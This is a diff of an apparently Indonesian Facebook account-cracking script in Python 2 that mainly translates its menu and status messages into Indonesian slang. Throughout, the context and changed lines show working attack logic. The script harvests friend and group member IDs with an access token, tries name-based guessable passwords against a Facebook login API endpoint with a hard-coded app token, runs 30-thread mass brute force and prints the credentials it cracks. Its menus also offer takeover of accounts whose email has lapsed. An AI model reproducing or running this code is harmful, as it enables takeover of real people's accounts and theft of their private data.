@@ -223,7 +223,7 @@ def informasi():
     os.system('clear')
     print logo
     print 52 * '\x1b[1;97m\xe2\x95\x90'
-    id = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID\x1b[1;97m/\x1b[1;92mName\x1b[1;91m : \x1b[1;97m')
+    id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukkan ID\x1b[1;97m/\x1b[1;92mName\x1b[1;91m : \x1b[1;97m')
     jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu \x1b[1;97m...')
     r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
     cok = json.loads(r.text)
@@ -273,11 +273,11 @@ def informasi():
                 except KeyError:
                     pass
 
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
             menu()
     else:
         print '\x1b[1;91m[\xe2\x9c\x96] Pengguna Tidak Ada'
-        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
         menu()
 
 
@@ -286,7 +286,7 @@ def menu_hack():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91m[!] Token not found'
+        print '\x1b[1;91m[!] Token tidak ditemukan'
         os.system('rm -rf login.txt')
         time.sleep(0.01)
         login()
@@ -294,13 +294,13 @@ def menu_hack():
     os.system('clear')
     print logo
     print 52 * '\x1b[1;97m\xe2\x95\x90'
-    print '║-> \x1b[1;37;40m1. Mini Hack Facebook (\x1b[1;92mTarget\x1b[1;97m)'
-    print '║-> \x1b[1;37;40m2. Multi Bruteforce Facebook'
-    print '║-> \x1b[1;37;40m3. Super Multi Bruteforce Facebook'
-    print '║-> \x1b[1;37;40m4. BruteForce (\x1b[1;92mTarget\x1b[1;97m)'
-    print '║-> \x1b[1;37;40m5. Yahoo Clone'
-    print '║-> \x1b[1;37;40m6. Ambil ID/Email/HP'
-    print '║-> \x1b[1;31;40m0. Back'
+    print '║-> \x1b[1;37;40m1. Retas FB Teman (\x1b[1;92mManual\x1b[1;97m)'
+    print '║-> \x1b[1;37;40m2. Retas Paksa (\x1b[1;92mMenggunakan File\x1b[1;97m)'
+    print '║-> \x1b[1;37;40m3. Super Retas Akun (\x1b[1;92mRandom Target\x1b[1;97m)'
+    print '║-> \x1b[1;37;40m4. MainTenance (\x1b[1;92mTarget\x1b[1;97m)'
+    print '║-> \x1b[1;37;40m5. Retas Akun Teman yang menggunakan Email Mati'
+    print '║-> \x1b[1;37;40m6. Ambil ID/Email/HP Teman'
+    print '║-> \x1b[1;31;40m0. Kembali'
     print '\x1b[1;37;40m║'
     hack_pilih()
 
@@ -308,7 +308,7 @@ def menu_hack():
 def hack_pilih():
     hack = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
     if hack == '':
-        print '\x1b[1;91m[!] Can\'t empty'
+        print '\x1b[1;91m[!] Pilih Angkanya Boss'
         hack_pilih()
     else:
         if hack == '1':
@@ -350,72 +350,72 @@ def mini():
         os.system('clear')
         print logo
         print 52 * '\x1b[1;97m\xe2\x95\x90'
-        print '\x1b[1;91m[ INFO ] Target must be your friend !'
+        print '\x1b[1;91m[ INFO ] Targetnya Harus Sudah Berteman Denganmu di Facebook !'
         try:
             id = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu ye \x1b[1;97m...')
             r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
             a = json.loads(r.text)
             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mName\x1b[1;97m : ' + a['name']
             jalan('\x1b[1;91m[+] \x1b[1;92mChecking \x1b[1;97m...')
             time.sleep(1)
-            jalan('\x1b[1;91m[+] \x1b[1;92mOpen security \x1b[1;97m...')
+            jalan('\x1b[1;91m[+] \x1b[1;92mOpen Security \x1b[1;97m...')
             time.sleep(1)
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu ye \x1b[1;97m...')
             print 52 * '\x1b[1;97m\xe2\x95\x90'
             pz1 = a['first_name'] + '123'
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             y = json.load(data)
             if 'access_token' in y:
-                print '\x1b[1;91m[+] \x1b[1;92mFounded.'
+                print '\x1b[1;91m[+] \x1b[1;92mKETEMU WOYY AWIKWOK.'
                 print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
-                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
-                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
-                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama Pengguna\x1b[1;97m : ' + id
+                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mKata Sandi\x1b[1;97m : ' + pz1
+                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                 menu_hack()
             else:
                 if 'www.facebook.com' in y['error_msg']:
-                    print '\x1b[1;91m[+] \x1b[1;92mFounded.'
-                    print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
-                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
-                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
-                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
-                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                    print '\x1b[1;91m[+] \x1b[1;92mKETEMU.'
+                    print '\x1b[1;91m[!] \x1b[1;93mYah, Akunnya Kena Sesi atau Checkpoint'
+                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama Pengguna\x1b[1;97m : ' + id
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mKata Sandi\x1b[1;97m : ' + pz1
+                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                     menu_hack()
                 else:
                     pz2 = a['first_name'] + '12345'
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     y = json.load(data)
                     if 'access_token' in y:
-                        print '\x1b[1;91m[+] \x1b[1;92mFounded.'
-                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
-                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
-                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
-                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                        print '\x1b[1;91m[+] \x1b[1;92mKETEMU WOYY AWIKWOK.'
+                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama Pengguna\x1b[1;97m : ' + id
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mKata Sandi\x1b[1;97m : ' + pz2
+                        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                         menu_hack()
                     else:
                         if 'www.facebook.com' in y['error_msg']:
-                            print '\x1b[1;91m[+] \x1b[1;92mFounded.'
-                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
-                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
-                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
-                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
-                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                            print '\x1b[1;91m[+] \x1b[1;92mKETEMU.'
+                            print '\x1b[1;91m[!] \x1b[1;93mTAPI AKUNNYA KENA SESU ATAU CHECKPOINT WKWK'
+                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama Pengguna\x1b[1;97m : ' + id
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mKata Sandi\x1b[1;97m : ' + pz2
+                            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                             menu_hack()
                         else:
                             pz3 = a['last_name'] + '123'
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             y = json.load(data)
                             if 'access_token' in y:
-                                print '\x1b[1;91m[+] \x1b[1;92mFounded.'
-                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
-                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
-                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
+                                print '\x1b[1;91m[+] \x1b[1;92mKETEMU WOYY AWIKWOK.'
+                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
+                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama Pengguna\x1b[1;97m : ' + id
+                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mKata Sandi\x1b[1;97m : ' + pz3
                                 raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                 menu_hack()
                             else:
                                 if 'www.facebook.com' in y['error_msg']:
-                                    print '\x1b[1;91m[+] \x1b[1;92mFounded.'
+                                    print '\x1b[1;91m[+] \x1b[1;92mKETEMU.'
                                     print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                                     print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                     print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
@@ -428,7 +428,7 @@ def mini():
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     y = json.load(data)
                                     if 'access_token' in y:
-                                        print '\x1b[1;91m[+] \x1b[1;92mFounded.'
+                                        print '\x1b[1;91m[+] \x1b[1;92mKETEMU WOYY AWIKWOK.'
                                         print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
@@ -464,13 +464,13 @@ def mini():
                                                     raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                                     menu_hack()
                                                 else:
-                                                    print '\x1b[1;91m[!] Sorry, opening password target failed :('
-                                                    print '\x1b[1;91m[!] Try other method.'
-                                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                                                    print '\x1b[1;91m[!] Maaf Bos, Akun Target ketat amat woyy :('
+                                                    print '\x1b[1;91m[!] Ohya, Cobain Metode Lain aja bre.'
+                                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mOke \x1b[1;91m]')
                                                     menu_hack()
         except KeyError:
-            print '\x1b[1;91m[!] Terget not found'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            print '\x1b[1;91m[!] Target tidak ditemukan'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
             menu_hack()
 
 
@@ -504,8 +504,8 @@ def crack():
                 zedd.join()
 
         except IOError:
-            print '\x1b[1;91m[!] File not found'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+            print '\x1b[1;91m[!] File tidak ada'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
             menu_hack()
 
 
@@ -545,7 +545,7 @@ def scrak():
             sys.stdout.flush()
 
     except IOError:
-        print '\n\x1b[1;91m[!] Connection busy'
+        print '\n\x1b[1;91m[!] Koneksi Bermasalah'
         time.sleep(0.01)
     except requests.exceptions.ConnectionError:
         print '\x1b[1;91m[\xe2\x9c\x96] No connection'
@@ -561,7 +561,7 @@ def hasil():
         print c
 
     print
-    print '\x1b[31m[x] Failed \x1b[1;97m--> ' + str(len(gagal))
+    print '\x1b[31m[x] Gagal \x1b[1;97m--> ' + str(len(gagal))
     keluar()
 
 
@@ -579,9 +579,9 @@ def super():
     os.system('clear')
     print logo
     print 52 * '\x1b[1;97m\xe2\x95\x90'
-    print '║-> \x1b[1;37;40m1. Crack from Friends'
-    print '║-> \x1b[1;37;40m2. Crack from Group'
-    print '║-> \x1b[1;37;40m3. Crack from File'
+    print '║-> \x1b[1;37;40m1. Retas Teman FB'
+    print '║-> \x1b[1;37;40m2. Retas Member Grup'
+    print '║-> \x1b[1;37;40m3. Retas dari File'
     print '║-> \x1b[1;31;40m0. Kembali'
     print '\x1b[1;37;40m║'
     pilih_super()
@@ -590,14 +590,14 @@ def super():
 def pilih_super():
     peak = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
     if peak == '':
-        print '\x1b[1;91m[!] Can\'t empty'
+        print '\x1b[1;91m[!] Pilih Angkanya Boss'
         pilih_super()
     else:
         if peak == '1':
             os.system('clear')
             print logo
             print 52 * '\x1b[1;97m\xe2\x95\x90'
-            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil id Teman \x1b[1;97m...')
+            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil ID Teman \x1b[1;97m...')
             r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
             z = json.loads(r.text)
             for s in z['data']:
@@ -614,8 +614,8 @@ def pilih_super():
                     asw = json.loads(r.text)
                     print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
                 except KeyError:
-                    print '\x1b[1;91m[!] Group not found'
-                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                    print '\x1b[1;91m[!] Join Grupnya dulu bro agar bisa'
+                    raw_input('\n\x1b[1;91m[ \x1b[1;97mOkay \x1b[1;91m]')
                     super()
 
                 re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
@@ -633,8 +633,8 @@ def pilih_super():
                         for line in open(idlist,'r').readlines():
                         	id.append(line.strip())
                     except IOError:
-                        print '\x1b[1;91m[!] File not found'
-                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+                        print '\x1b[1;91m[!] File tidak ada'
+                        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                         super()
 
                 else:
@@ -644,7 +644,7 @@ def pilih_super():
                         print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                         pilih_super()
     print '\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
-    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu \x1b[1;97m...')
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Woyy \x1b[1;97m...')
     titik = ['.   ', '..  ', '... ']
     for o in titik:
         print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
@@ -719,7 +719,7 @@ def pilih_super():
 
     p = ThreadPool(30)
     p.map(main, id)
-    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
+    print '\n\x1b[1;91m[+] \x1b[1;97mSegitu aja Boss'
     raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
     super()
 
@@ -819,9 +819,9 @@ def menu_yahoo():
     os.system('clear')
     print logo
     print 52 * '\x1b[1;97m\xe2\x95\x90'
-    print '║-> \x1b[1;37;40m1. From Friends'
-    print '║-> \x1b[1;37;40m2. From File'
-    print '║-> \x1b[1;31;40m0. Back'
+    print '║-> \x1b[1;37;40m1. dari Teman'
+    print '║-> \x1b[1;37;40m2. dari File'
+    print '║-> \x1b[1;31;40m0. Kembali'
     print '\x1b[1;37;40m║'
     yahoo_pilih()
 
@@ -829,7 +829,7 @@ def menu_yahoo():
 def yahoo_pilih():
     go = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
     if go == '':
-        print '\x1b[1;91m[!] Can\'t empty'
+        print '\x1b[1;91m[!] Pilih Angkanya Boss'
         yahoo_pilih()
     else:
         if go == '1':
@@ -935,7 +935,7 @@ def yahoolist():
     jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
     save = open('MailVuln.txt', 'w')
     print 52 * '\x1b[1;97m\xe2\x95\x90'
-    print '\x1b[1;91m[?] \x1b[1;97mStatus \x1b[1;91m:  \x1b[1;97mRed[\x1b[1;92m' + vulnot + '\x1b[1;97m]  Green[\x1b[1;92m' + vuln + '\x1b[1;97m]'
+    print '\x1b[1;91m[?] \x1b[1;97mStatus \x1b[1;91m:  \x1b[1;97mMerah[\x1b[1;92m' + vulnot + '\x1b[1;97m]  Hijau[\x1b[1;92m' + vuln + '\x1b[1;97m]'
     print
     mail = open(files, 'r').readlines()
     for pw in mail:
